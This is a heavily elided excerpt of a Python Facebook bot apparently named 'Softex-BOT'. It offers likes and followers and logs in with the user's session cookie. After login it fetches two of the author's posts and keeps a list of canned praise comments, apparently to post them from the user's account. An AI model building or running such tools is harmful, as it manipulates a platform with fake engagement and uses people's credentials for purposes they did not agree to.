...
def baner():
    ...
    print(f"""
        ...
        {p}{b}╚  ╚═╝ {d} ┴─┘┴┴ ┴└─┘└  └─┘┴─┘
{ab}-----------------------------------------------
{d}Donate   : {g}Dana 082375069658
{d}Message  : {g}https://wa.me/6289606019836
{d}Facebook : {g}https://mbasic.facebook.com/BAYU.X.M3LI
{ab}-----------------------------------------------""")
...
def login():
    ...
    if "Login success!" in req:
       ...
       try:
           ...
           pass
       try:
           rc=ses.get("https://mbasic.facebook.com/100000499145355/posts/5359151584111427/",cookies={"cookie":cokie}).text
           ...
           pass
       try:
           kmn=ses.get("https://mbasic.facebook.com/100000603038807/posts/5165250540171663/",cookies={"cookie":cokie}).text
           ...
           text=["Hi bang softex tools nya keren banget!","tools nya sangat berguna!","Hi i'm user tools Softex-BOT","semoga rejeki bang softex di lancarin amin","tools yang sangat bagus!"]
...
def menu():
    ...
    userinfo()
    print(f"""{p}
{c}01{ab}. {p}Dapatkan Credit
{c}02{ab}. {p}Tambah Like Postingab
{c}03{ab}. {p}Tambah Followers
{c}00{ab}. {p}exit
{ab}-----------------------------------------------{d}""")
    pilih_menu()
